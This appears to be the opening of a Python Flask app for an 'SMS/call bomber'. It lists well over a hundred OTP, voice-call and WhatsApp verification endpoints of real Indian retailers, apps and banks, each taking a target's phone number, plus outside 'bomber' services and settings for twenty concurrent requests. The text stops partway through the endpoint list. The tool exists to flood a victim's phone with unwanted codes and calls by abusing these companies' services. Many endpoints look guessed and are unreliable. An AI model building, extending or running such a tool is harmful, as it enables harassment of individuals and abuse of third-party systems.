# app.py
from flask import Flask, request, jsonify, session
import requests
import os
import time
import json
from concurrent.futures import ThreadPoolExecutor, as_completed
import threading
import re

app = Flask(__name__)
# Secret key for session management (important for production)
app.secret_key = os.environ.get('SECRET_KEY') # Change this to a random secret key

# --- Configuration ---
MAX_REQUESTS = 10
TIME_WINDOW = 3600  # 1 hour
TIMEOUT = 15  # Timeout for each API request
MAX_WORKERS = 20  # Number of concurrent requests
# --- End Configuration ---

# --- Rate Limiting Helper ---
def check_rate_limit():
    """Checks if the current session has exceeded the request limit."""
    current_time = time.time()
    if 'request_count' not in session:
        session['request_count'] = 1
        session['first_request_time'] = current_time
        return True

    session['request_count'] += 1
    elapsed_time = current_time - session.get('first_request_time', current_time)

    if elapsed_time > TIME_WINDOW:
        # Reset the window
        session['request_count'] = 1
        session['first_request_time'] = current_time
        return True
    elif session['request_count'] > MAX_REQUESTS:
        return False # Rate limit exceeded

    return True # Within limit

# --- API List (Converted from PHP) ---
APIS = [
    # Special Bomber APIs
    {
        "name": "FreeFire Bomber",
        "url": "https://freefire-api.ct.ws/bomber4.php",
        "method": "GET",
        "params": {"phone": "{phone}", "duration": "30"},
        "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
        "json_data": None,
        "form_data": None
    },
    {
        "name": "Call Bomber API",
        "url": "https://call-bomber-50k3t8a6r-rohit-harshes-projects.vercel.app/bomb",
        "method": "GET",
        "params": {"number": "{phone}"},
        "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
        "json_data": None,
        "form_data": None
    },
    {
        "name": "Bomberr API",
        "url": "https://bomberr.onrender.com/num={phone}",
        "method": "GET",
        "params": None, # Params are part of URL
        "headers": {"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"},
        "json_data": None,
        "form_data": None
    },
    # Voice Call APIs
    {
        "name": "Tata Capital Voice Call",
        "url": "https://mobapp.tatacapital.com/DLPDelegator/authentication/mobile/v0.1/sendOtpOnVoice",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "isOtpViaCallAtLogin": "true"},
        "form_data": None
    },
    {
        "name": "1MG Voice Call",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "json_data": {"number": "{phone}", "otp_on_call": True},
        "form_data": None
    },
    {
        "name": "Swiggy Call Verification",
        "url": "https://profile.swiggy.com/api/v3/app/request_call_verification",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Myntra Voice Call",
        "url": "https://www.myntra.com/gw/mobile-auth/voice-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Flipkart Voice Call",
        "url": "https://www.flipkart.com/api/6/user/voice-otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Amazon Voice Call",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": {"phone": "{phone}", "action": "voice_otp"}
    },
    {
        "name": "Paytm Voice Call",
        "url": "https://accounts.paytm.com/signin/voice-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Zomato Voice Call",
        "url": "https://www.zomato.com/php/o2_api_handler.php",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": {"phone": "{phone}", "type": "voice"}
    },
    {
        "name": "MakeMyTrip Voice Call",
        "url": "https://www.makemytrip.com/api/4/voice-otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Goibibo Voice Call",
        "url": "https://www.goibibo.com/user/voice-otp/generate/",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Ola Voice Call",
        "url": "https://api.olacabs.com/v1/voice-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Uber Voice Call",
        "url": "https://auth.uber.com/v2/voice-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    # WhatsApp APIs
    {
        "name": "KPN WhatsApp",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "params": {"channel": "AND", "version": "3.2.6"},
        "headers": {
            "x-app-id": "66ef3594-1e51-4e15-87c5-05fc8208a20f",
            "content-type": "application/json; charset=UTF-8"
        },
        "json_data": {"notification_channel": "WHATSAPP", "phone_number": {"country_code": "+91", "number": "{phone}"}},
        "form_data": None
    },
    {
        "name": "Foxy WhatsApp",
        "url": "https://www.foxy.in/api/v2/users/send_otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"user": {"phone_number": "+91{phone}"}},
        "form_data": None
    },
    {
        "name": "Stratzy WhatsApp",
        "url": "https://stratzy.in/api/web/whatsapp/sendOTP",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phoneNo": "{phone}"},
        "form_data": None
    },
    {
        "name": "Jockey WhatsApp",
        "url": "https://www.jockey.in/apps/jotp/api/login/resend-otp/+91{phone}",
        "method": "GET",
        "params": {"whatsapp": "true"},
        "headers": {},
        "json_data": None,
        "form_data": None
    },
    {
        "name": "Rappi WhatsApp",
        "url": "https://services.mxgrability.rappi.com/api/rappi-authentication/login/whatsapp/create",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json; charset=utf-8"},
        "json_data": {"country_code": "+91", "phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Eka Care WhatsApp",
        "url": "https://auth.eka.care/auth/init",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json; charset=UTF-8"},
        "json_data": {"payload": {"allowWhatsapp": True, "mobile": "+91{phone}"}, "type": "mobile"},
        "form_data": None
    },
    # SMS APIs
    {
        "name": "Lenskart",
        "url": "https://api-gateway.juno.lenskart.com/v3/customers/sendOtp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phoneCode": "+91", "telephone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Hungama",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un"},
        "form_data": None
    },
    {
        "name": "Meru Cab",
        "url": "https://merucabapp.com/api/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "mobile_number={phone}"
    },
    {
        "name": "Dayco India",
        "url": "https://ekyc.daycoindia.com/api/nscript_functions.php",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "api=send_otp&mob={phone}"
    },
    {
        "name": "NoBroker",
        "url": "https://www.nobroker.in/api/v3/account/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "phone={phone}&countryCode=IN"
    },
    {
        "name": "ShipRocket",
        "url": "https://sr-wave-api.shiprocket.in/v1/customer/auth/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobileNumber": "{phone}"},
        "form_data": None
    },
    {
        "name": "PenPencil",
        "url": "https://api.penpencil.co/v1/users/resend-otp",
        "method": "POST",
        "params": {"smsType": "1"},
        "headers": {"content-type": "application/json"},
        "json_data": {"organizationId": "5eb393ee95fab7468a79d189", "mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "1mg",
        "url": "https://www.1mg.com/auth_api/v6/create_token",
        "method": "POST",
        "params": None,
        "headers": {"content-type": "application/json"},
        "json_data": {"number": "{phone}", "otp_on_call": True},
        "form_data": None
    },
    {
        "name": "KPN Fresh",
        "url": "https://api.kpnfresh.com/s/authn/api/v1/otp-generate",
        "method": "POST",
        "params": {"channel": "WEB"},
        "headers": {"content-type": "application/json"},
        "json_data": {"phone_number": {"number": "{phone}", "country_code": "+91"}},
        "form_data": None
    },
    {
        "name": "Servetel",
        "url": "https://api.servetel.in/v1/auth/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "mobile_number={phone}"
    },
    {
        "name": "Doubtnut",
        "url": "https://api.doubtnut.com/v4/student/login",
        "method": "POST",
        "params": None,
        "headers": {"content-type": "application/json"},
        "json_data": {"phone_number": "{phone}", "language": "en"},
        "form_data": None
    },
    {
        "name": "GoPink Cabs",
        "url": "https://www.gopinkcabs.com/app/cab/customer/login_admin_code.php",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "check_mobile_number=1&contact={phone}"
    },
    {
        "name": "Myntra",
        "url": "https://www.myntra.com/gw/mobile-auth/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Flipkart",
        "url": "https://2.rome.api.flipkart.com/api/4/user/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobileNumber": "{phone}"},
        "form_data": None
    },
    {
        "name": "Amazon",
        "url": "https://www.amazon.in/ap/signin",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "email={phone}&create=1"
    },
    {
        "name": "Zomato",
        "url": "https://www.zomato.com/php/asyncLogin.php",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "phone={phone}"
    },
    {
        "name": "Paytm",
        "url": "https://accounts.paytm.com/signin/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "loginData": "LOGIN_USING_PHONE"},
        "form_data": None
    },
    {
        "name": "PhonePe",
        "url": "https://www.phonepe.com/api/v2/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "BigBasket",
        "url": "https://www.bigbasket.com/bb-oauth/api/v2.0/otp/generate/",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile_number": "{phone}"},
        "form_data": None
    },
    {
        "name": "Meesho",
        "url": "https://api.meesho.com/v2/auth/send_otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Snapdeal",
        "url": "https://www.snapdeal.com/authenticate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Makemytrip",
        "url": "https://www.makemytrip.com/api/umbrella/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "OYO",
        "url": "https://api.oyoroomscrm.com/api/v2/user/send_otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Rapido",
        "url": "https://rapido.bike/api/v2/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Uber",
        "url": "https://auth.uber.com/v2/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Domino's",
        "url": "https://order.godominos.co.in/Online/App.aspx",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/x-www-form-urlencoded"},
        "json_data": None,
        "form_data": "PhoneNo={phone}"
    },
    {
        "name": "BookMyShow",
        "url": "https://in.bmscdn.com/mjson/User/SendOTP",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobileNo": "{phone}"},
        "form_data": None
    },
    {
        "name": "Netmeds",
        "url": "https://www.netmeds.com/api/send_otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Medlife",
        "url": "https://api.medlife.com/v2/user/sendOTP",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Practo",
        "url": "https://www.practo.com/patient/loginviapassword",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Ajio",
        "url": "https://www.ajio.com/api/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobileNumber": "{phone}"},
        "form_data": None
    },
    {
        "name": "Nykaa",
        "url": "https://www.nykaa.com/api/auth/send-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Croma",
        "url": "https://api.croma.com/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Reliance Digital",
        "url": "https://www.reliancedigital.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "FirstCry",
        "url": "https://www.firstcry.com/api/sendotp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Licious",
        "url": "https://api.licious.com/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Zepto",
        "url": "https://api.zepto.com/v2/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Blinkit",
        "url": "https://blinkit.com/api/otp/generate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Mobikwik",
        "url": "https://www.mobikwik.com/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Freecharge",
        "url": "https://www.freecharge.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Airtel Thanks",
        "url": "https://www.airtel.in/thanks-app/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Jio",
        "url": "https://www.jio.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Vodafone Idea",
        "url": "https://www.myvi.in/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Byju's",
        "url": "https://byjus.com/api/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Unacademy",
        "url": "https://unacademy.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Vedantu",
        "url": "https://www.vedantu.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Toppr",
        "url": "https://www.toppr.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "WhiteHat Jr",
        "url": "https://www.whitehatjr.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Cult.fit",
        "url": "https://www.cult.fit/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "HealthifyMe",
        "url": "https://www.healthifyme.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Pristyn Care",
        "url": "https://www.pristyncare.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "PharmEasy",
        "url": "https://pharmeasy.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Tata 1mg",
        "url": "https://www.1mg.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Apollo 24/7",
        "url": "https://www.apollo247.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "MFine",
        "url": "https://www.mfine.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "DocsApp",
        "url": "https://www.docsapp.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Lybrate",
        "url": "https://www.lybrate.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Portea Medical",
        "url": "https://www.portea.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "PolicyBazaar",
        "url": "https://www.policybazaar.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "CoverFox",
        "url": "https://www.coverfox.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Acko",
        "url": "https://www.acko.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Digit Insurance",
        "url": "https://www.godigit.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "HDFC Ergo",
        "url": "https://www.hdfcergo.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "ICICI Lombard",
        "url": "https://www.icicilombard.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Bajaj Allianz",
        "url": "https://www.bajajallianz.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Star Health",
        "url": "https://www.starhealth.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Max Bupa",
        "url": "https://www.maxbupa.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Kotak Life",
        "url": "https://www.kotaklife.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "SBI Life",
        "url": "https://www.sbilife.co.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "LIC India",
        "url": "https://www.licindia.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "HDFC Life",
        "url": "https://www.hdfclife.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Axis Bank",
        "url": "https://www.axisbank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "ICICI Bank",
        "url": "https://www.icicibank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "HDFC Bank",
        "url": "https://www.hdfcbank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "SBI Bank",
        "url": "https://www.sbi.co.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Kotak Bank",
        "url": "https://www.kotak.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Yes Bank",
        "url": "https://www.yesbank.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "IndusInd Bank",
        "url": "https://www.indusind.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "IDFC Bank",
        "url": "https://www.idfcfirstbank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "AU Bank",
        "url": "https://www.aubank.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "RBL Bank",
        "url": "https://www.rblbank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Bandhan Bank",
        "url": "https://www.bandhanbank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Federal Bank",
        "url": "https://www.federalbank.co.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Canara Bank",
        "url": "https://www.canarabank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "PNB",
        "url": "https://www.pnbindia.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Bank of Baroda",
        "url": "https://www.bankofbaroda.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Union Bank",
        "url": "https://www.unionbankofindia.co.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Indian Bank",
        "url": "https://www.indianbank.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Central Bank",
        "url": "https://www.centralbankofindia.co.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Bank of India",
        "url": "https://www.bankofindia.co.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "IDBI Bank",
        "url": "https://www.idbibank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "UCO Bank",
        "url": "https://www.ucobank.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Indian Overseas Bank",
        "url": "https://www.iob.in/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Punjab & Sind Bank",
        "url": "https://www.psbindia.com/api/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    # Additional APIs
    {
        "name": "Wakefit SMS",
        "url": "https://api.wakefit.co/api/consumer-sms-otp/",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Byju's SMS",
        "url": "https://api.byjus.com/v2/otp/send",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Hungama OTP",
        "url": "https://communication.api.hungama.com/v1/communication/otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobileNo": "{phone}", "countryCode": "+91", "appCode": "un", "messageId": "1", "device": "web"},
        "form_data": None
    },
    {
        "name": "PenPencil V3",
        "url": "https://xylem-api.penpencil.co/v1/users/register/64254d66be2a390018e6d348",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}"},
        "form_data": None
    },
    {
        "name": "Entri",
        "url": "https://entri.app/api/v3/users/check-phone/",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}"},
        "form_data": None
    },
    {
        "name": "Cosmofeed",
        "url": "https://prod.api.cosmofeed.com/api/user/authenticate",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"phone": "{phone}", "version": "1.4.28"},
        "form_data": None
    },
    {
        "name": "Aakash",
        "url": "https://antheapi.aakash.ac.in/api/generate-lead-otp",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile_number": "{phone}", "activity_type": "aakash-myadmission"},
        "form_data": None
    },
    {
        "name": "Revv",
        "url": "https://st-core-admin.revv.co.in/stCore/api/customer/v1/init",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "deviceType": "website"},
        "form_data": None
    },
    {
        "name": "DeHaat",
        "url": "https://oidc.agrevolution.in/auth/realms/dehaat/custom/sendOTP",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "client_id": "kisan-app"},
        "form_data": None
    },
    {
        "name": "A23 Games",
        "url": "https://pfapi.a23games.in/a23user/signup_by_mobile_otp/v2",
        "method": "POST",
        "params": None,
        "headers": {"Content-Type": "application/json"},
        "json_data": {"mobile": "{phone}", "device_id": "android123", "model": "Google,Android SDK built for x86,10"},
        "form_data": None
    },
    {
        "name": "Spencer's",
